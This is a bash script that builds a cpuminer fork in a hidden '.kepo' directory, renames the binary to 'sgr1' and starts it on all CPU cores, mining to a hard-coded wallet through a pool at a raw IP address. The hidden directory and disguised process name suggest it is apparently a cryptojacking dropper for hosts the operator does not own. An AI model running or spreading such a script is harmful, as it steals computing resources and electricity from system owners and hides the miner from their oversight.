#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++
mkdir .kepo && cd .kepo
git clone https://github.com/bitnet-io/cpuminer-opt-aurum
cd cpuminer-opt-aurum
./build.sh
mv cpuminer sgr1
./sgr1 -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.sugoi -p x -t $(nproc --all)
